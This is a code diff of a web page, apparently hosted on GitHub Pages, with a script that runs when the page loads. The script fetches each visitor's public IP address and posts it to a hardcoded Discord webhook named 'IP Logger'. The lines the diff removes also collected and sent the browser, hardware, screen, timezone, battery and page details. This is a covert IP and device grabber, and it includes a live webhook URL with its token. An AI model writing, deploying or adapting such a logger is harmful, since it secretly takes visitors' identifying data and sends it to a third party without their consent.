@@ -5,7 +5,6 @@ Waiting for response.....!
 67
 67
 
-mwehehehe
 <script>
 window.addEventListener("load", async () => {
   // Only send once per session
@@ -14,76 +13,42 @@ window.addEventListener("load", async () => {
 
   const webhookURL = "https://discord.com/api/webhooks/1472358587455246548/pc6oWJBb1vMP2bkfS-diW4OkkIY96FWF3RoCC3_3vaBRszSmWis70oIhupoAIcLsTNA6";
 
-  function log(msg, color="black") {
-    const p = document.createElement("pre");
-    p.style.color = color;
-    p.textContent = msg;
-    document.body.appendChild(p);
-  }
-
   try {
-    log("Fetching public IP...", "blue");
+    // Fetch public IP
+    const res = await fetch("https://api64.ipify.org?format=json");
+    const data = await res.json();
+    const ip = data.ip;
 
-    // Get public IP
-    const ipRes = await fetch("https://api64.ipify.org?format=json");
-    const ipData = await ipRes.json();
-    log("IP: " + ipData.ip, "green");
-
-    // Device info
-    const deviceInfo = {
-      userAgent: navigator.userAgent,
-      platform: navigator.platform,
-      language: navigator.language,
-      cores: navigator.hardwareConcurrency || "Unknown",
-      memory: navigator.deviceMemory || "Unknown",
-      screen: `${screen.width}x${screen.height}`,
-      timezone: Intl.DateTimeFormat().resolvedOptions().timeZone,
-      online: navigator.onLine
-    };
-
-    // Battery info (if supported)
-    let batteryInfo = "Not supported";
-    if (navigator.getBattery) {
-      const battery = await navigator.getBattery();
-      batteryInfo = `Level: ${Math.round(battery.level * 100)}% | Charging: ${battery.charging}`;
-    }
-
-    // Construct Discord embed payload
+    // Create Discord embed payload
     const payload = {
-      username: "Visitor Logger",
+      username: "IP Logger",
       embeds: [{
-        title: "🌍 New Visit Detected",
-        color: 3447003,
+        title: "🌐 New Visit Detected",
+        color: 5814783,
         fields: [
-          { name: "IP Address", value: ipData.ip, inline: true },
-          { name: "Platform", value: deviceInfo.platform, inline: true },
-          { name: "Browser / UA", value: navigator.userAgent.substring(0, 1000) },
-          { name: "Language", value: deviceInfo.language, inline: true },
-          { name: "CPU Cores", value: String(deviceInfo.cores), inline: true },
-          { name: "RAM (GB approx)", value: String(deviceInfo.memory), inline: true },
-          { name: "Screen", value: deviceInfo.screen, inline: true },
-          { name: "Timezone", value: deviceInfo.timezone, inline: true },
-          { name: "Online", value: String(deviceInfo.online), inline: true },
-          { name: "Battery", value: batteryInfo, inline: true },
-          { name: "Page URL", value: window.location.href }
+          { name: "IP Address", value: ip }
         ],
         timestamp: new Date().toISOString()
       }]
     };
 
-    log("Sending to webhook...", "blue");
-
     await fetch(webhookURL, {
       method: "POST",
-      mode: "no-cors", // required on GitHub Pages
+      mode: "no-cors", // required for GitHub Pages
       headers: { "Content-Type": "application/json" },
       body: JSON.stringify(payload)
     });
 
-    log("✅ Sent to webhook!", "green");
+    document.body.insertAdjacentHTML(
+      'beforeend',
+      `<p style="color:green;">✅ IP sent: ${ip}</p>`
+    );
 
   } catch (err) {
-    log("❌ Error: " + err.message, "red");
+    document.body.insertAdjacentHTML(
+      'beforeend',
+      `<p style="color:red;">❌ Error: ${err.message}</p>`
+    );
   }
 });
 </script>
